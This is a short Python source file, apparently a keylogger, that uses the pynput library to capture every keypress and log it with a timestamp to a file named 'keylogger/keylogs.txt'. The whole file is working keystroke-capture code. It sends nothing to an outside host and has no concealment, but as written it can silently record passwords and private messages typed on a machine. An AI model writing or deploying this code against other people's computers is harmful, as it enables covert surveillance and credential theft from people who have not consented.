from pynput import keyboard
import logging

log_dir = "keylogger/"

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format="%(asctime)s:%(message)s")

def keypress(key):
    """
    Callback function to handle keypress events.

    Args:
        key (pynput.keyboard.Key): The key that was pressed.

    Returns:
        None
    """
    try:
        logging.info(str(key))
    except AttributeError:
        """
        Handle special keys
        """
        print("A special key {0} has been pressed.".format(key))


with keyboard.Listener(on_press=keypress) as listener:
    """
    Start listening for keypresses
    """
    listener.join()

